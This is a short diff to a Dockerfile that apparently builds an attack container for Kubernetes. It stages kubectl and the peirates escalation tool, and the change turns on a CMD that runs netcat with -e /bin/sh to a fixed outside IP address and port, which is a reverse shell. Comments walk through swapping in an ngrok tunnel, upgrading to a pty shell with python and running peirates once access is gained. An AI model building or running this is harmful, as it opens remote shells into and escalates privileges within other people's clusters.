@@ -9,7 +9,7 @@ RUN chmod +x /tmp/kubectl
 RUN tar -xf /tmp/peirates.tar.xz
 RUN rm /tmp/peirates.tar.xz
 # Change part 2 and 3 to your own ngrok TCP tunnel
-# CMD ["nc","35.157.111.131","16556","-e","/bin/sh"]
+CMD ["nc","35.157.111.131","16556","-e","/bin/sh"]
 # Once shell is obtained, upgrade shell with python3 -c "import pty;pty.spawn('/usr/local/bin/bash')"
 # Go to /tmp
 # tar -xf peirates.tar.xz
@@ -17,4 +17,4 @@ RUN rm /tmp/peirates.tar.xz
 # cd p*
 # ./peirates
 # Leave container up instead of reverse shell as we have terminal exec rights
-CMD ["/bin/sh"]
+#CMD ["/bin/sh"]
